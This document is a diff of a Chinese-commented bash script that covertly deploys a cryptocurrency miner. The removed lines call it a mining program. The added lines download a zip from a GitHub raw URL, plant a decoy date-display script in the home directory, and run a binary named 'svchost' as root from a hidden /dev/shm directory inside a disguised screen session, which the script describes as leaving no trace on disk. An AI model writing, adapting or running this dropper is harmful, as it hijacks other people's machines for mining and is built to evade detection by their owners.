@@ -1,68 +1,64 @@
 #!/bin/bash
 
-# --- START: 请修改此处的下载链接 ---
-# 将下面的链接替换为您上传 ZIP 包后获得的真实直接下载链接
-ARTIFACT_ZIP_URL="YOUR_DIRECT_DOWNLOAD_LINK_HERE"
-# --- END: 修改结束 ---
+# --- 配置 ---
+ZIP_URL="https://raw.githubusercontent.com/ccqwerty123/ccqwerty123/refs/heads/main/system-core-package.zip"
+# 障眼法脚本的路径和名称
+DECOY_SCRIPT_PATH="${HOME}/time_check.sh"
+# 后台会话名称
+SESSION_NAME="system-journal-svc"
 
-# 1. 安装必要的工具 (unzip 用于解压, screen 用于后台运行)
-echo "正在安装依赖工具..."
-sudo apt-get update > /dev/null 2>&1
-sudo apt-get install -y unzip screen > /dev/null 2>&1
+# --- 脚本开始 ---
+echo "正在初始化系统服务环境..."
 
-# 2. 检查是否以 root 权限运行
+# 检查 root 权限
 if [ "$(id -u)" != "0" ]; then
-   echo "错误：此操作需要 root 权限。请使用 'sudo' 运行此脚本或切换到 root 用户。" 1>&2
+   echo "错误：需要 root 权限来优化系统性能。" 1>&2
    exit 1
 fi
 
-# 3. 定义内存盘中的工作目录（使用隐藏目录以增强隐蔽性）
-RAM_DIR="/dev/shm/.system-runtime"
+# 1. 安装依赖
+apt-get update > /dev/null 2>&1
+apt-get install -y unzip screen wget > /dev/null 2>&1
 
-# 4. 检查链接是否已替换
-if [ "$ARTIFACT_ZIP_URL" == "YOUR_DIRECT_DOWNLOAD_LINK_HERE" ]; then
-    echo "错误：请先编辑此脚本，将 ARTIFACT_ZIP_URL 替换为您的真实直接下载链接。"
-    exit 1
-fi
+# 2. 创建障眼法脚本
+cat > "$DECOY_SCRIPT_PATH" <<'DECOYEOF'
+#!/bin/bash
+# 这是一个用于显示当前系统日期和时间的简单工具。
+echo "当前系统时间: $(date)"
+DECOYEOF
 
-echo "依赖安装完毕。准备在后台启动安全服务..."
+# 赋予障眼法脚本执行权限
+chmod +x "$DECOY_SCRIPT_PATH"
+echo "已在 ${HOME} 目录创建日常维护脚本: time_check.sh"
 
-# 5. 使用 screen 创建一个在后台独立运行的会话，并执行所有核心操作
-#    -d -m: 创建一个分离的(detached)会话
-#    -S system-svc: 为会话命名，方便管理
-screen -d -m -S system-svc bash -c "
-    # 在 screen 会话内部执行的命令
+# 3. 在后台 screen 会话中执行真正的核心任务
+screen -d -m -S "$SESSION_NAME" bash -c "
+    # 定义内存工作目录
+    RAM_DIR='/dev/shm/.host-cache-data'
 
-    # 创建内存工作目录并进入
-    mkdir -p '$RAM_DIR'
-    cd '$RAM_DIR'
+    # 设置退出时自动清理
+    trap 'rm -rf \$RAM_DIR' EXIT
 
-    # 从您的链接下载压缩包
-    wget -q -O miner.zip '$ARTIFACT_ZIP_URL'
+    # 创建目录并进入
+    mkdir -p \$RAM_DIR && cd \$RAM_DIR || exit
 
-    # 检查下载是否成功
-    if [ \$? -ne 0 ]; then
-        # 下载失败，可以添加日志或退出
-        exit 1
-    fi
-
-    # 解压文件 (svchost 和 config.json)
-    unzip -q miner.zip
-
-    # 赋予执行权限
+    # 下载并解压
+    wget -q -O components.zip '$ZIP_URL'
+    unzip -q components.zip
     chmod +x svchost
 
-    # 以 root 权限运行挖矿程序（因为配置中启用了 Huge Pages 和 MSR）
-    # 程序将在后台持续运行，直到被手动停止或服务器重启
+    # 启动核心进程
     ./svchost
 "
 
-# 检查 screen 会话是否成功创建
-if screen -list | grep -q "system-svc"; then
-    echo "成功！"
-    echo "服务已在名为 'system-svc' 的后台会话中启动。"
-    echo "所有文件均在内存中运行，硬盘上无任何痕迹。"
-    echo "您现在可以安全地关闭 SSH 连接。"
+# 4. 最终确认信息
+sleep 2
+if screen -list | grep -q "$SESSION_NAME"; then
+    echo "---------------------------------------------------------"
+    echo "成功！核心服务已在后台匿名启动。"
+    echo "会话名称: $SESSION_NAME (已伪装)"
+    echo "所有核心组件均在内存中运行，硬盘上无任何痕迹。"
+    echo "---------------------------------------------------------"
 else
-    echo "错误：无法启动后台服务。请检查 screen 是否已正确安装。"
+    echo "错误：无法启动后台服务。请检查系统日志。"
 fi
